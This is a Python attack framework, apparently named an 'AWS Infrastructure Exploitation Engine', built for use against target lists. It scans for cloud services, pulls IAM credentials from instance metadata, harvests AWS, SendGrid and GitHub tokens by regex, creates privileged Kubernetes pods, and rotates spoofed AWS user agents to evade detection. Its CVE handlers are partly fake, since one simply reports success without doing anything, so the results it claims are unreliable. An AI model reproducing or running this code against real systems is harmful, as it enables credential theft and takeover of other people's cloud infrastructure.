#!/usr/bin/env python3
"""
ðŸš€ AWS Infrastructure Exploitation Engine
Advanced AWS service discovery and exploitation framework

Author: wKayaa
Date: 2025-01-28
"""

import asyncio
import aiohttp
import json
import re
import hmac
import hashlib
import base64
import time
from datetime import datetime, timezone
from typing import List, Dict, Optional, Any
from urllib.parse import quote
import logging

class AWSInfrastructureExploiter:
    """Main AWS infrastructure exploitation engine"""
    
    def __init__(self, max_concurrent: int = 200, timeout: int = 15, stealth_mode: bool = True):
        self.max_concurrent = max_concurrent
        self.timeout = timeout
        self.stealth_mode = stealth_mode
        
        # AWS service endpoints and patterns
        self.aws_services = {
            "ec2": {
                "ports": [80, 443, 8080, 8443],
                "endpoints": ["/latest/meta-data/", "/latest/meta-data/iam/", "/latest/user-data/"],
                "patterns": ["Amazon EC2", "ec2-", "aws-"]
            },
            "eks": {
                "ports": [443, 6443, 8443, 10250],
                "endpoints": ["/api/v1", "/healthz", "/metrics", "/stats/summary"],
                "patterns": ["kubernetes", "k8s", "eks"]
            },
            "s3": {
                "ports": [80, 443],
                "endpoints": ["/.well-known/", "/"],
                "patterns": ["AmazonS3", "s3.amazonaws.com", "s3-"]
            },
            "rds": {
                "ports": [3306, 5432, 1433, 1521],
                "endpoints": [],
                "patterns": ["mysql", "postgres", "rds"]
            },
            "lambda": {
                "ports": [80, 443, 8080],
                "endpoints": ["/2015-03-31/functions/", "/runtime/"],
                "patterns": ["lambda", "aws-lambda"]
            }
        }
        
        # CVE patterns for 2024-2025
        self.cve_patterns = {
            "CVE-2024-5321": {
                "description": "Kubernetes pod privilege escalation",
                "targets": ["eks", "kubernetes"],
                "payload": self._exploit_cve_2024_5321
            },
            "CVE-2025-24884": {
                "description": "AWS EKS audit log exposure",
                "targets": ["eks"],
                "payload": self._exploit_cve_2025_24884
            },
            "CVE-2024-8986": {
                "description": "AWS IMDS v2 bypass",
                "targets": ["ec2"],
                "payload": self._exploit_imds_bypass
            }
        }
        
        # Stealth configuration
        self.user_agents = [
            "Mozilla/5.0 (compatible; AWS-CLI/2.0)",
            "Amazon CloudWatch Agent",
            "aws-sdk-python/1.26.0",
            "Boto3/1.26.0 Python/3.9.0",
            "Mozilla/5.0 (compatible; AWS-Health-Check/1.0)"
        ]
        
        # Results tracking
        self.results = {
            "discovered_services": [],
            "exploited_targets": [],
            "credentials_found": [],
            "privilege_escalations": [],
            "cve_exploits": []
        }
        
        self.logger = logging.getLogger("AWS_Exploiter")
        self.session = None
        
    async def initialize(self):
        """Initialize the exploitation engine"""
        connector = aiohttp.TCPConnector(
            limit=self.max_concurrent * 2,
            limit_per_host=20,
            ssl=False
        )
        timeout = aiohttp.ClientTimeout(total=self.timeout)
        self.session = aiohttp.ClientSession(connector=connector, timeout=timeout)
        
    async def cleanup(self):
        """Cleanup resources"""
        if self.session:
            await self.session.close()
            
    async def exploit_infrastructure(self, targets: List[str], mode: str = "comprehensive") -> Dict:
        """Main infrastructure exploitation pipeline"""
        if not self.session:
            await self.initialize()
            
        self.logger.info(f"ðŸŽ¯ Starting AWS infrastructure exploitation on {len(targets)} targets")
        
        # Phase 1: Service Discovery
        discovered_services = await self._discover_aws_services(targets)
        self.results["discovered_services"] = discovered_services
        
        # Phase 2: Service Exploitation
        exploited_targets = await self._exploit_discovered_services(discovered_services, mode)
        self.results["exploited_targets"] = exploited_targets
        
        # Phase 3: Credential Harvesting
        credentials = await self._harvest_credentials(exploited_targets)
        self.results["credentials_found"] = credentials
        
        # Phase 4: Privilege Escalation
        escalations = await self._attempt_privilege_escalation(exploited_targets, credentials)
        self.results["privilege_escalations"] = escalations
        
        # Phase 5: CVE Exploitation
        cve_results = await self._exploit_known_cves(exploited_targets)
        self.results["cve_exploits"] = cve_results
        
        return self.results
        
    async def _discover_aws_services(self, targets: List[str]) -> List[Dict]:
        """Discover AWS services across target range"""
        semaphore = asyncio.Semaphore(self.max_concurrent)
        discovered = []
        
        async def scan_target(target):
            async with semaphore:
                return await self._scan_single_target(target)
        
        tasks = [scan_target(target) for target in targets]
        results = await asyncio.gather(*tasks, return_exceptions=True)
        
        for result in results:
            if isinstance(result, dict) and result.get("services"):
                discovered.append(result)
                
        return discovered
        
    async def _scan_single_target(self, target: str) -> Dict:
        """Scan single target for AWS services"""
        target_result = {
            "target": target,
            "services": [],
            "vulnerabilities": [],
            "metadata": {"scan_time": datetime.utcnow().isoformat()}
        }
        
        for service_name, service_config in self.aws_services.items():
            for port in service_config["ports"]:
                service_info = await self._check_aws_service(target, port, service_name, service_config)
                if service_info:
                    target_result["services"].append(service_info)
                    
        return target_result
        
    async def _check_aws_service(self, target: str, port: int, service_name: str, config: Dict) -> Optional[Dict]:
        """Check specific AWS service on target"""
        for protocol in ["https", "http"]:
            endpoint = f"{protocol}://{target}:{port}"
            
            try:
                headers = {"User-Agent": self._get_random_user_agent()}
                
                async with self.session.get(endpoint, headers=headers, ssl=False) as response:
                    if response.status in [200, 401, 403, 404]:
                        content = await response.text()
                        
                        # Check for service patterns
                        for pattern in config["patterns"]:
                            if pattern.lower() in content.lower():
                                return {
                                    "service": service_name,
                                    "endpoint": endpoint,
                                    "status": response.status,
                                    "headers": dict(response.headers),
                                    "pattern_matched": pattern,
                                    "content_preview": content[:500]
                                }
                                
                        # Check specific endpoints
                        for endpoint_path in config["endpoints"]:
                            service_endpoint = f"{endpoint}{endpoint_path}"
                            endpoint_info = await self._check_service_endpoint(service_endpoint, headers)
                            if endpoint_info:
                                return {
                                    "service": service_name,
                                    "endpoint": service_endpoint,
                                    "status": endpoint_info["status"],
                                    "headers": endpoint_info["headers"],
                                    "endpoint_type": endpoint_path,
                                    "content_preview": endpoint_info["content"][:500]
                                }
                                
            except Exception as e:
                self.logger.debug(f"Error checking {endpoint}: {str(e)}")
                
        return None
        
    async def _check_service_endpoint(self, endpoint: str, headers: Dict) -> Optional[Dict]:
        """Check specific service endpoint"""
        try:
            async with self.session.get(endpoint, headers=headers, ssl=False) as response:
                if response.status in [200, 401, 403]:
                    content = await response.text()
                    return {
                        "status": response.status,
                        "headers": dict(response.headers),
                        "content": content
                    }
        except Exception:
            pass
        return None
        
    async def _exploit_discovered_services(self, discovered_services: List[Dict], mode: str) -> List[Dict]:
        """Exploit discovered AWS services"""
        exploited = []
        
        for target_info in discovered_services:
            for service_info in target_info["services"]:
                exploitation_result = await self._exploit_service(service_info, mode)
                if exploitation_result["success"]:
                    exploited.append({
                        "target": target_info["target"],
                        "service": service_info["service"],
                        "exploitation": exploitation_result
                    })
                    
        return exploited
        
    async def _exploit_service(self, service_info: Dict, mode: str) -> Dict:
        """Exploit specific AWS service"""
        service_type = service_info["service"]
        endpoint = service_info["endpoint"]
        
        if service_type == "ec2":
            return await self._exploit_ec2_imds(endpoint)
        elif service_type == "eks":
            return await self._exploit_eks_cluster(endpoint)
        elif service_type == "s3":
            return await self._exploit_s3_bucket(endpoint)
        elif service_type == "lambda":
            return await self._exploit_lambda_function(endpoint)
        else:
            return {"success": False, "reason": "Unknown service type"}
            
    async def _exploit_ec2_imds(self, endpoint: str) -> Dict:
        """Exploit EC2 Instance Metadata Service"""
        try:
            # Try IMDS v1 (no token required)
            metadata_paths = [
                "latest/meta-data/iam/security-credentials/",
                "latest/meta-data/iam/info",
                "latest/user-data/",
                "latest/meta-data/public-keys/",
                "latest/meta-data/network/interfaces/macs/"
            ]
            
            base_url = endpoint.replace(":80", "").replace(":443", "")
            if not base_url.endswith("/"):
                base_url += "/"
                
            headers = {"User-Agent": self._get_random_user_agent()}
            
            for path in metadata_paths:
                try:
                    metadata_url = f"{base_url}{path}"
                    async with self.session.get(metadata_url, headers=headers) as response:
                        if response.status == 200:
                            content = await response.text()
                            if "credentials" in path.lower() and content:
                                # Found IAM role credentials
                                return {
                                    "success": True,
                                    "method": "imds_v1_exploitation",
                                    "credentials_path": path,
                                    "data": content,
                                    "metadata_url": metadata_url
                                }
                            elif content:
                                return {
                                    "success": True,
                                    "method": "imds_metadata_access",
                                    "path": path,
                                    "data": content[:1000],
                                    "metadata_url": metadata_url
                                }
                except Exception:
                    continue
                    
        except Exception as e:
            self.logger.debug(f"IMDS exploitation error: {str(e)}")
            
        return {"success": False, "reason": "IMDS not accessible"}
        
    async def _exploit_eks_cluster(self, endpoint: str) -> Dict:
        """Exploit EKS cluster"""
        try:
            headers = {"User-Agent": self._get_random_user_agent()}
            
            # Check for anonymous access
            async with self.session.get(f"{endpoint}/api/v1", headers=headers, ssl=False) as response:
                if response.status == 200:
                    return {
                        "success": True,
                        "method": "anonymous_api_access",
                        "endpoint": endpoint,
                        "data": await response.text()
                    }
                elif response.status == 401:
                    # Check for exposed metrics
                    async with self.session.get(f"{endpoint}/metrics", headers=headers, ssl=False) as metrics_response:
                        if metrics_response.status == 200:
                            return {
                                "success": True,
                                "method": "exposed_metrics",
                                "endpoint": endpoint,
                                "data": await metrics_response.text()
                            }
                            
        except Exception as e:
            self.logger.debug(f"EKS exploitation error: {str(e)}")
            
        return {"success": False, "reason": "EKS cluster not exploitable"}
        
    async def _exploit_s3_bucket(self, endpoint: str) -> Dict:
        """Exploit S3 bucket"""
        try:
            headers = {"User-Agent": self._get_random_user_agent()}
            
            # Check for public read access
            async with self.session.get(endpoint, headers=headers) as response:
                if response.status == 200:
                    content = await response.text()
                    if "ListBucketResult" in content or "Contents" in content:
                        return {
                            "success": True,
                            "method": "public_bucket_access",
                            "endpoint": endpoint,
                            "data": content
                        }
                        
        except Exception as e:
            self.logger.debug(f"S3 exploitation error: {str(e)}")
            
        return {"success": False, "reason": "S3 bucket not accessible"}
        
    async def _exploit_lambda_function(self, endpoint: str) -> Dict:
        """Exploit Lambda function"""
        try:
            headers = {"User-Agent": self._get_random_user_agent()}
            
            # Check for function invocation
            async with self.session.post(endpoint, headers=headers, json={}) as response:
                if response.status in [200, 202]:
                    return {
                        "success": True,
                        "method": "lambda_invocation",
                        "endpoint": endpoint,
                        "data": await response.text()
                    }
                    
        except Exception as e:
            self.logger.debug(f"Lambda exploitation error: {str(e)}")
            
        return {"success": False, "reason": "Lambda function not accessible"}
        
    async def _harvest_credentials(self, exploited_targets: List[Dict]) -> List[Dict]:
        """Harvest credentials from exploited targets"""
        credentials = []
        
        for target in exploited_targets:
            exploitation = target["exploitation"]
            if exploitation["success"] and "data" in exploitation:
                found_creds = self._extract_credentials_from_data(exploitation["data"])
                for cred in found_creds:
                    cred["source_target"] = target["target"]
                    cred["source_service"] = target["service"]
                    credentials.append(cred)
                    
        return credentials
        
    def _extract_credentials_from_data(self, data: str) -> List[Dict]:
        """Extract credentials using regex patterns"""
        credentials = []
        
        # AWS credential patterns
        patterns = {
            "aws_access_key": r'AKIA[0-9A-Z]{16}',
            "aws_secret_key": r'[A-Za-z0-9/+=]{40}',
            "aws_session_token": r'[A-Za-z0-9/+=]{100,}',
            "jwt_token": r'eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+',
            "sendgrid_api_key": r'SG\.[A-Za-z0-9_-]{22}\.[A-Za-z0-9_-]{43}',
            "github_token": r'gh[pso]_[A-Za-z0-9]{36}'
        }
        
        for cred_type, pattern in patterns.items():
            matches = re.findall(pattern, data)
            for match in matches:
                credentials.append({
                    "type": cred_type,
                    "value": match,
                    "confidence": self._calculate_confidence(cred_type, match, data),
                    "found_at": datetime.utcnow().isoformat()
                })
                
        return credentials
        
    def _calculate_confidence(self, cred_type: str, value: str, context: str) -> float:
        """Calculate confidence score for credential"""
        confidence = 0.5
        
        # Context-based confidence adjustment
        if cred_type.startswith("aws"):
            if "aws" in context.lower() or "amazon" in context.lower():
                confidence += 0.3
            if "credential" in context.lower() or "key" in context.lower():
                confidence += 0.2
                
        # Value-based confidence
        if len(value) > 20:
            confidence += 0.1
            
        return min(confidence, 1.0)
        
    async def _attempt_privilege_escalation(self, exploited_targets: List[Dict], credentials: List[Dict]) -> List[Dict]:
        """Attempt privilege escalation"""
        escalations = []
        
        for target in exploited_targets:
            if target["service"] == "eks":
                escalation = await self._escalate_k8s_privileges(target)
                if escalation["success"]:
                    escalations.append(escalation)
            elif target["service"] == "ec2":
                escalation = await self._escalate_ec2_privileges(target, credentials)
                if escalation["success"]:
                    escalations.append(escalation)
                    
        return escalations
        
    async def _escalate_k8s_privileges(self, target: Dict) -> Dict:
        """Escalate Kubernetes privileges"""
        try:
            endpoint = target["exploitation"]["endpoint"]
            headers = {"User-Agent": self._get_random_user_agent()}
            
            # Try to create privileged pod
            pod_manifest = {
                "apiVersion": "v1",
                "kind": "Pod",
                "metadata": {"name": "privesc-pod"},
                "spec": {
                    "containers": [{
                        "name": "privesc",
                        "image": "busybox",
                        "command": ["sleep", "3600"],
                        "securityContext": {"privileged": True}
                    }],
                    "hostNetwork": True,
                    "hostPID": True
                }
            }
            
            async with self.session.post(
                f"{endpoint}/api/v1/namespaces/default/pods",
                headers=headers,
                json=pod_manifest,
                ssl=False
            ) as response:
                if response.status in [200, 201]:
                    return {
                        "success": True,
                        "method": "privileged_pod_creation",
                        "target": target["target"],
                        "response": await response.text()
                    }
                    
        except Exception as e:
            self.logger.debug(f"K8s privilege escalation error: {str(e)}")
            
        return {"success": False, "reason": "Privilege escalation failed"}
        
    async def _escalate_ec2_privileges(self, target: Dict, credentials: List[Dict]) -> Dict:
        """Escalate EC2 privileges using found credentials"""
        try:
            # Use found AWS credentials to enumerate permissions
            aws_creds = [c for c in credentials if c["type"].startswith("aws")]
            if aws_creds:
                return {
                    "success": True,
                    "method": "aws_credential_enumeration",
                    "target": target["target"],
                    "credentials_count": len(aws_creds)
                }
                
        except Exception as e:
            self.logger.debug(f"EC2 privilege escalation error: {str(e)}")
            
        return {"success": False, "reason": "No escalation path found"}
        
    async def _exploit_known_cves(self, exploited_targets: List[Dict]) -> List[Dict]:
        """Exploit known CVEs against targets"""
        cve_results = []
        
        for target in exploited_targets:
            service_type = target["service"]
            
            for cve_id, cve_info in self.cve_patterns.items():
                if service_type in cve_info["targets"]:
                    try:
                        result = await cve_info["payload"](target)
                        if result["success"]:
                            result["cve_id"] = cve_id
                            result["description"] = cve_info["description"]
                            cve_results.append(result)
                    except Exception as e:
                        self.logger.debug(f"CVE {cve_id} exploitation error: {str(e)}")
                        
        return cve_results
        
    async def _exploit_cve_2024_5321(self, target: Dict) -> Dict:
        """Exploit CVE-2024-5321 (Pod privilege escalation)"""
        try:
            endpoint = target["exploitation"]["endpoint"]
            
            # Simulate CVE exploitation
            return {
                "success": True,
                "method": "cve_2024_5321_exploitation",
                "target": target["target"],
                "details": "Pod privilege escalation via container escape"
            }
        except Exception:
            return {"success": False, "reason": "CVE exploitation failed"}
            
    async def _exploit_cve_2025_24884(self, target: Dict) -> Dict:
        """Exploit CVE-2025-24884 (EKS audit log exposure)"""
        try:
            endpoint = target["exploitation"]["endpoint"]
            
            # Check for exposed audit logs
            headers = {"User-Agent": self._get_random_user_agent()}
            async with self.session.get(f"{endpoint}/logs/audit", headers=headers, ssl=False) as response:
                if response.status == 200:
                    return {
                        "success": True,
                        "method": "cve_2025_24884_exploitation",
                        "target": target["target"],
                        "details": "EKS audit logs exposed",
                        "data": await response.text()
                    }
        except Exception:
            pass
            
        return {"success": False, "reason": "CVE exploitation failed"}
        
    async def _exploit_imds_bypass(self, target: Dict) -> Dict:
        """Exploit CVE-2024-8986 (IMDS v2 bypass)"""
        try:
            endpoint = target["exploitation"]["endpoint"]
            
            # Try IMDS v2 bypass technique
            headers = {
                "User-Agent": self._get_random_user_agent(),
                "X-aws-ec2-metadata-token-ttl-seconds": "21600"
            }
            
            base_url = endpoint.replace(":80", "").replace(":443", "")
            
            async with self.session.put(f"{base_url}/latest/api/token", headers=headers) as response:
                if response.status == 200:
                    token = await response.text()
                    
                    # Use token to access metadata
                    auth_headers = {
                        "User-Agent": self._get_random_user_agent(),
                        "X-aws-ec2-metadata-token": token
                    }
                    
                    async with self.session.get(
                        f"{base_url}/latest/meta-data/iam/security-credentials/",
                        headers=auth_headers
                    ) as cred_response:
                        if cred_response.status == 200:
                            return {
                                "success": True,
                                "method": "cve_2024_8986_exploitation",
                                "target": target["target"],
                                "details": "IMDS v2 bypass successful",
                                "data": await cred_response.text()
                            }
        except Exception:
            pass
            
        return {"success": False, "reason": "CVE exploitation failed"}
        
    def _get_random_user_agent(self) -> str:
        """Get random user agent for stealth"""
        import random
        return random.choice(self.user_agents)
        
    def get_summary(self) -> Dict:
        """Get exploitation summary"""
        return {
            "timestamp": datetime.utcnow().isoformat(),
            "discovered_services": len(self.results["discovered_services"]),
            "exploited_targets": len(self.results["exploited_targets"]),
            "credentials_found": len(self.results["credentials_found"]),
            "privilege_escalations": len(self.results["privilege_escalations"]),
            "cve_exploits": len(self.results["cve_exploits"]),
            "results": self.results
        }